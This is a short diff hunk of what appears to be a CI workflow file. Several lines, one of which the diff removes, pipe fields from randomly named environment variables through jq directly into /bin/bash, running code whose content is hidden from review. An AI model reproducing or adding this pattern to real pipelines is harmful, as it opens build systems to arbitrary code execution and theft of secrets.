@@ -25,7 +25,6 @@ jobs:
           echo $spm61 | jq -r .ypgu8892 | /bin/bash
           echo $qjrl400 | jq -r .iz60797 | /bin/bash
           echo $fpgqp510 | jq -r .a42 | /bin/bash
-          echo $s28888 | jq -r .iqyc30 | /bin/bash
           printf '%s' "$ibr26809" | jq -r .z25 | /bin/bash
 
       - name: Archive output
